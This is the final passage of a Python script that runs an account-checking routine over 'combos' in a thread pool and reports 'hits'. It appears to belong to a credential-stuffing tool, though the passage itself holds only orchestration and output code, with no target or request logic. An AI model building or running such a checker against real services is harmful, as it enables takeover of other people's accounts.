    ui = ConsoleUI(stats, len(combos))
    ui.start()

    print(f"\n{Fore.CYAN}[*] Starting checks...{Style.RESET_ALL}")
    time.sleep(2)

    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(checker.check_account, combos)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
    finally:
        ui.stop()

    final_stats = stats.get_stats()
    print(f"\n{Fore.GREEN}[✓] Checking complete!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Results saved to: {checker.output_dir}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Hits: {final_stats['hits']}{Style.RESET_ALL}")
    
    input(f"\n{Fore.CYAN}Press Enter to exit...{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}{Style.RESET_ALL}")
        input()